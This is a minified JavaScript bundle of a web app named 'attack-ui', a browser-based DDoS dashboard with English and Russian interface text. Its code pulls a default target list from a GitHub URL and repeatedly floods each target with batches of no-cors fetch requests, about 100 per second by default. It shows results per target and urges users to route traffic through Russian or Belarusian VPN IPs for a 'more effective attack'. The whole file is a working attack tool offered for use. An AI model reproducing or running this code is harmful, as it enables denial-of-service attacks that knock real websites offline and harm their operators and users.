(()=>{"use strict";var t={7590:(t,e,a)=>{a(8156),a(6509);var r=a(4779),o=a(7233),n=a(536);function s(t,e){const a=(0,n.up)("router-view");return(0,n.wg)(),(0,n.j4)(a)}var i=a(9895);const l={},c=(0,i.Z)(l,[["render",s]]),d=c;var u=a(1639),g=a(6780),f=a(8597);const p=[{name:"MainLayout",path:"/",component:()=>Promise.all([a.e(736),a.e(166)]).then(a.bind(a,2166)),children:[{name:"Index",path:"/",component:()=>a.e(780).then(a.bind(a,8780)),redirect:{name:"DdosConfig"}},{name:"AttackLayout",path:"/attack",component:()=>Promise.all([a.e(736),a.e(505)]).then(a.bind(a,3505)),redirect:{name:"Index"},children:[{name:"DdosConfig",path:"ddos/config",component:()=>Promise.all([a.e(736),a.e(930)]).then(a.bind(a,3930))},{name:"DdosAttack",path:"ddos/start",component:()=>Promise.all([a.e(736),a.e(371)]).then(a.bind(a,2371))}]}]},{path:"/:catchAll(.*)*",component:()=>Promise.all([a.e(736),a.e(837)]).then(a.bind(a,2143))}],b=p;var m=a(2216);const v=(0,g.BC)((function(){const t=f.PO,e=(0,f.p7)({scrollBehavior:()=>({left:0,top:0}),routes:b,history:t("/")});return e.beforeEach((()=>{m.c.page()})),e}));async function h(t,e){const r="function"===typeof u["default"]?await(0,u["default"])({}):u["default"],{storeKey:n}=await Promise.resolve().then(a.bind(a,1639)),s="function"===typeof v?await v({store:r}):v;r.$router=s;const i=t(d);return i.use(o.Z,e),{app:i,store:r,storeKey:n,router:s}}var k=a(1712),y=a(652);const w={config:{},plugins:{Notify:k.Z,Dialog:y.Z}},L="/";async function A({app:t,router:e,store:a,storeKey:r},o){let n=!1;const s=t=>{try{return e.resolve(t).href}catch(a){}return Object(t)===t?null:t},i=t=>{if(n=!0,"string"===typeof t&&/^https?:\/\//.test(t))return void(window.location.href=t);const e=s(t);null!==e&&(window.location.href=e)},l=window.location.href.replace(window.location.origin,"");for(let d=0;!1===n&&d<o.length;d++)try{await o[d]({app:t,router:e,store:a,ssrContext:null,redirect:i,urlPath:l,publicPath:L})}catch(c){return c&&c.url?void i(c.url):void console.error("[Quasar] boot error:",c)}!0!==n&&(t.use(e),t.use(a,r),t.mount("#q-app"))}h(r.ri,w).then((t=>Promise.all([Promise.resolve().then(a.bind(a,4361))]).then((e=>{const a=e.map((t=>t.default)).filter((t=>"function"===typeof t));A(t,a)}))))},4361:(t,e,a)=>{a.r(e),a.d(e,{default:()=>d,i18n:()=>c});var r=a(6780),o=a(2496);const n={attackPage:{pageTitle:"DDOS Dashboard",stopBtnLabel:"Stop",actionsHint:"Stop/Start can take up to 1 minute",startBtnLabel:"Start",statusTitle:"Status",attackActiveStatusLabel:"Active",attackStoppedStatusLabel:"Stopped",resultsCardTitle:"Results",table:{target:"Target",success:"Success requests",errors:"Errors count"}},attackConfigPage:{pageTitle:"DDOS Configuration",connectionsTitle:"Connections",reqCountFieldLabel:"Sites requests per second",reqCountFieldHint:"Recommended quantity - 100",streamsCountLabel:"Streams count",streamsCountHint:"In development",resetConfigBtnLabel:"Reset",startAttackBtnLabel:"Start attack",removeAllTargetsBtnLabel:"Remove All Targets",targetsCardTitle:"Targets",addTargetFieldLabel:"Link/ip to target",addTargetBtnLabel:"Add",targetTooltipText:"Click to open in a new tab",invalidTargetNotify:"It doesn`t look like a url or ip address",targetaAreadyAddedNotify:"Target already added",targetAddedNotify:"Target added",errorReqDefaultNotify:"Error requesting default targets",attackStartedDialog:{title:"Attack started",description:'Until you press the "Stop" button or close the tab, the attack will be active. Startup may take up to 1 minute',okBtnLabel:"Okey"}},nav:{ddosDasboardLabel:"DDOS Dashboard",ddosConfigLabel:"DDOS Config"},ipNotify:{title:"Use VPN with Russian or Belarusian IP for more effective attack",ipLabel:"Your IP",countryLabel:"IP Country",reloadBtnLabel:"Reload",updatedAtLabel:"Last updated at"}},s={attackPage:{pageTitle:"Панель управления DDOS",stopBtnLabel:"Остановаить",startBtnLabel:"Начать",actionsHint:"Остановка/Начало могут занять до 1 минуты",statusTitle:"Статус",attackActiveStatusLabel:"Атака в процессе",attackStoppedStatusLabel:"Остановлена",resultsCardTitle:"Результаты атаки",table:{target:"Цель",success:"Успешных запросов",errors:"Ошибок"}},attackConfigPage:{pageTitle:"Настройка DDOS",connectionsTitle:"Запросы",reqCountFieldLabel:"Запросов к  сайту в секунду",reqCountFieldHint:"Рекомендуемое количество - 100",streamsCountLabel:"Количство потоков",streamsCountHint:"В разработке",resetConfigBtnLabel:"Восстановить по умолчанию",startAttackBtnLabel:"Начать атаку",removeAllTargetsBtnLabel:"Удалить все цели",targetsCardTitle:"Цели",addTargetFieldLabel:"Ссылка или IP",addTargetBtnLabel:"Добавить",targetTooltipText:"Нажмите, чтобы открыть в новой вкладке",invalidTargetNotify:"Это не похоже на URL или IP адрес",targetaAreadyAddedNotify:"Цель уже добавлена",targetAddedNotify:"Цель добавлена",errorReqDefaultNotify:"Ошибка при запросе целей по умолчанию",attackStartedDialog:{title:"Атака началась",description:'Пока вы не нажмете кнопку "Стоп" или не закроете вкладку, атака будет активной. Запуск может занять до 1 минуты',okBtnLabel:"Окей"}},nav:{ddosDasboardLabel:"Управление DDOS",ddosConfigLabel:"Настройка DDOS"},ipNotify:{title:"Используйте VPN с российским или белорусским IP для более эффективной атаки",ipLabel:"Ваш IP",countryLabel:"IP нахожиться в",reloadBtnLabel:"Обновить",updatedAtLabel:"Последнее обновление в"}},i={en:n,ru:s},l=localStorage.getItem("lang")||navigator.language||navigator.userLanguage;let c;const d=(0,r.xr)((({app:t})=>{c=(0,o.o)({legacy:!1,locale:l,messages:i}),t.use(c)}))},2216:(t,e,a)=>{a.d(e,{c:()=>n});var r=a(4262),o=a(5535);const n=(0,r.ZP)({app:"attack-ui",version:100,plugins:[(0,o.ZP)({trackingId:"G-NK7LWBDXMY"})]})},1639:(t,e,a)=>{a.r(e),a.d(e,{default:()=>V});var r={};a.r(r),a.d(r,{getBrowserAttackIntervalId:()=>b,getBrowserAttackResults:()=>p,getBrowserAttackStatus:()=>f,getDdosConfig:()=>u,getResultsBrowserAttack:()=>g,getTargetsList:()=>d});var o={};a.r(o),a.d(o,{removeAllTargets:()=>P,removeTarget:()=>D,resetDdosConfig:()=>j,setBrowserAttackIntervalId:()=>x,setBrowserAttackStatus:()=>E,setDdosConfig:()=>N,setInitTargets:()=>O,setResultsBrowserAttack:()=>q,setTarget:()=>I});var n={};a.r(n),a.d(n,{destroyBrowserAttack:()=>U,initBrowserAttack:()=>K,setDefaultTargets:()=>M});var s=a(6780),i=a(3721),l=a(4883);function c(){return{targetsList:[],config:{user:{},default:{reqCount:100,streamsCount:1}},resultsBrowserAttack:{},browserAttackStatus:!1,browserAttackIntervalId:null}}a(6509);const d=t=>t.targetsList,u=t=>t.config,g=t=>t.resultsBrowserAttack,f=t=>t.browserAttackStatus,p=t=>Object.entries(t.resultsBrowserAttack).map((([t,e])=>({target:t,...e}))),b=t=>t.browserAttackIntervalId;var m=a(1712);const v={timeout:1500,progress:!0,actions:[{icon:"close",color:"white"}]},h=t=>(m.Z.create({type:"negative",message:t,...v}),!0),k=t=>{m.Z.create({message:t,...v})};a(7918);var y=a(7790),w=a.n(y),L=a(3245),A=a.n(L),C=a(4361);const T=t=>C.i18n.global.t(t),S=(t,e)=>{if(t)if(w()(t)||A()(t)){if(!(e.indexOf(t.trim())>-1))return!0;h(T("attackConfigPage.targetaAreadyAddedNotify"))}else h(T("attackConfigPage.invalidTargetNotify"))};var B=a(2216);const P=t=>{B.c.track("remove-all-targets"),t.targetsList=[]},D=(t,e)=>{B.c.track("remove-target"),t.targetsList.splice(e,1)},I=(t,{target:e,callback:a})=>{B.c.track("set-target"),t.targetsList.indexOf(e)>0||S(e,t.targetsList)&&(t.targetsList.unshift(e),k(T("attackConfigPage.targetAddedNotify")),a&&a())},O=(t,e)=>{P(t),t.targetsList.push(...e)},N=(t,e)=>{for(const a in e)e[a]=Number(e[a]);t.config.user=e},j=t=>{t.config.user=t.config.default},q=(t,e)=>{const a=t.resultsBrowserAttack;for(const r in e)a[r]||(a[r]={success:0,error:0}),a[r][e[r]?"success":"error"]++},E=(t,e)=>{t.browserAttackStatus=e},x=(t,e)=>{t.browserAttackIntervalId=e},R=async()=>{const t=await fetch("https://raw.githubusercontent.com/ilya-belik/targets/main/targets.json"),e=await t.json();return e};a(1832);var _=a(652);const F=async({title:t,message:e,okLabel:a,cancelLabel:r})=>await new Promise((o=>{_.Z.create({title:t,message:e,cancel:!!r,ok:{label:a,noCaps:!0,color:"dark"},cancel:{label:r,noCaps:!0,flat:!0,color:"red"}}).onOk((()=>{o(!0)})).onOk((()=>{o(!0)})).onCancel((()=>{o(!1)})).onDismiss((()=>{o(!1)}))})),Z=async t=>await new Promise(((e,a)=>{const r={};for(let n=0;n<t.length;n++)try{const a=t[n],o=new AbortController,s=setTimeout((()=>o.abort()),1e4);fetch(a,{method:"GET",mode:"no-cors",signal:o.signal}).then((()=>{r[a]=!0})).catch((()=>{r[a]=!1})).finally((()=>{clearTimeout(s),Object.keys(r).length===t.length&&e(r)}))}catch(o){console.error(o)}})),H=()=>{F({title:T("attackConfigPage.attackStartedDialog.title"),message:T("attackConfigPage.attackStartedDialog.description"),okLabel:T("attackConfigPage.attackStartedDialog.okBtnLabel")})},M=async t=>{try{if(t.getters.getTargetsList.length>0)return;const e=await R();t.commit("setInitTargets",e)}catch(e){h(T("attackConfigPage.errorReqDefaultNotify")),console.error(e)}},K=t=>{B.c.track("init-browser-ddos");const e=t.getters.getDdosConfig.user,a=t.getters.getTargetsList,r=t.getters.getBrowserAttackIntervalId;t.commit("setBrowserAttackStatus",!0);let o=0;const n=setInterval((async()=>{const r=o>=a.length?0:o+1,n=r+e.reqCount;o=n;const s=await Z(a.slice(r,n));t.commit("setResultsBrowserAttack",s)}),1e3);t.commit("setBrowserAttackIntervalId",n),r||setTimeout((()=>{H()}),1e3)},U=t=>{B.c.track("destroy-browser-ddos");const e=t.getters.getBrowserAttackIntervalId;clearInterval(e),t.commit("setBrowserAttackIntervalId",null),t.commit("setBrowserAttackStatus",!1)},G={namespaced:!0,state:c,getters:r,mutations:o,actions:n},V=(0,s.h)((function(){const t=new l.ZP({storage:window.localStorage}),e=(0,i.MT)({modules:{ddos:G},plugins:[t.plugin],strict:!1});return e}))}},e={};function a(r){var o=e[r];if(void 0!==o)return o.exports;var n=e[r]={exports:{}};return t[r].call(n.exports,n,n.exports,a),n.exports}a.m=t,(()=>{var t=[];a.O=(e,r,o,n)=>{if(!r){var s=1/0;for(d=0;d<t.length;d++){for(var[r,o,n]=t[d],i=!0,l=0;l<r.length;l++)(!1&n||s>=n)&&Object.keys(a.O).every((t=>a.O[t](r[l])))?r.splice(l--,1):(i=!1,n<s&&(s=n));if(i){t.splice(d--,1);var c=o();void 0!==c&&(e=c)}}return e}n=n||0;for(var d=t.length;d>0&&t[d-1][2]>n;d--)t[d]=t[d-1];t[d]=[r,o,n]}})(),(()=>{a.n=t=>{var e=t&&t.__esModule?()=>t["default"]:()=>t;return a.d(e,{a:e}),e}})(),(()=>{a.d=(t,e)=>{for(var r in e)a.o(e,r)&&!a.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:e[r]})}})(),(()=>{a.f={},a.e=t=>Promise.all(Object.keys(a.f).reduce(((e,r)=>(a.f[r](t,e),e)),[]))})(),(()=>{a.u=t=>"js/"+t+"."+{166:"576ae4a3",371:"dc253907",505:"0d478b7f",780:"d95d6502",837:"99a7429f",930:"b817f7cf"}[t]+".js"})(),(()=>{a.miniCssF=t=>"css/"+({143:"app",736:"vendor"}[t]||t)+"."+{143:"4cf142da",505:"043d59a9",736:"f35281a0",930:"b680c0fc"}[t]+".css"})(),(()=>{a.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(t){if("object"===typeof window)return window}}()})(),(()=>{a.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e)})(),(()=>{var t={},e="attack-ui-app:";a.l=(r,o,n,s)=>{if(t[r])t[r].push(o);else{var i,l;if(void 0!==n)for(var c=document.getElementsByTagName("script"),d=0;d<c.length;d++){var u=c[d];if(u.getAttribute("src")==r||u.getAttribute("data-webpack")==e+n){i=u;break}}i||(l=!0,i=document.createElement("script"),i.charset="utf-8",i.timeout=120,a.nc&&i.setAttribute("nonce",a.nc),i.setAttribute("data-webpack",e+n),i.src=r),t[r]=[o];var g=(e,a)=>{i.onerror=i.onload=null,clearTimeout(f);var o=t[r];if(delete t[r],i.parentNode&&i.parentNode.removeChild(i),o&&o.forEach((t=>t(a))),e)return e(a)},f=setTimeout(g.bind(null,void 0,{type:"timeout",target:i}),12e4);i.onerror=g.bind(null,i.onerror),i.onload=g.bind(null,i.onload),l&&document.head.appendChild(i)}}})(),(()=>{a.r=t=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})}})(),(()=>{a.p="/"})(),(()=>{var t=(t,e,a,r)=>{var o=document.createElement("link");o.rel="stylesheet",o.type="text/css";var n=n=>{if(o.onerror=o.onload=null,"load"===n.type)a();else{var s=n&&("load"===n.type?"missing":n.type),i=n&&n.target&&n.target.href||e,l=new Error("Loading CSS chunk "+t+" failed.\n("+i+")");l.code="CSS_CHUNK_LOAD_FAILED",l.type=s,l.request=i,o.parentNode.removeChild(o),r(l)}};return o.onerror=o.onload=n,o.href=e,document.head.appendChild(o),o},e=(t,e)=>{for(var a=document.getElementsByTagName("link"),r=0;r<a.length;r++){var o=a[r],n=o.getAttribute("data-href")||o.getAttribute("href");if("stylesheet"===o.rel&&(n===t||n===e))return o}var s=document.getElementsByTagName("style");for(r=0;r<s.length;r++){o=s[r],n=o.getAttribute("data-href");if(n===t||n===e)return o}},r=r=>new Promise(((o,n)=>{var s=a.miniCssF(r),i=a.p+s;if(e(s,i))return o();t(r,i,o,n)})),o={143:0};a.f.miniCss=(t,e)=>{var a={505:1,930:1};o[t]?e.push(o[t]):0!==o[t]&&a[t]&&e.push(o[t]=r(t).then((()=>{o[t]=0}),(e=>{throw delete o[t],e})))}})(),(()=>{var t={143:0};a.f.j=(e,r)=>{var o=a.o(t,e)?t[e]:void 0;if(0!==o)if(o)r.push(o[2]);else{var n=new Promise(((a,r)=>o=t[e]=[a,r]));r.push(o[2]=n);var s=a.p+a.u(e),i=new Error,l=r=>{if(a.o(t,e)&&(o=t[e],0!==o&&(t[e]=void 0),o)){var n=r&&("load"===r.type?"missing":r.type),s=r&&r.target&&r.target.src;i.message="Loading chunk "+e+" failed.\n("+n+": "+s+")",i.name="ChunkLoadError",i.type=n,i.request=s,o[1](i)}};a.l(s,l,"chunk-"+e,e)}},a.O.j=e=>0===t[e];var e=(e,r)=>{var o,n,[s,i,l]=r,c=0;if(s.some((e=>0!==t[e]))){for(o in i)a.o(i,o)&&(a.m[o]=i[o]);if(l)var d=l(a)}for(e&&e(r);c<s.length;c++)n=s[c],a.o(t,n)&&t[n]&&t[n][0](),t[n]=0;return a.O(d)},r=self["webpackChunkattack_ui_app"]=self["webpackChunkattack_ui_app"]||[];r.forEach(e.bind(null,0)),r.push=e.bind(null,r.push.bind(r))})();var r=a.O(void 0,[736],(()=>a(7590)));r=a.O(r)})();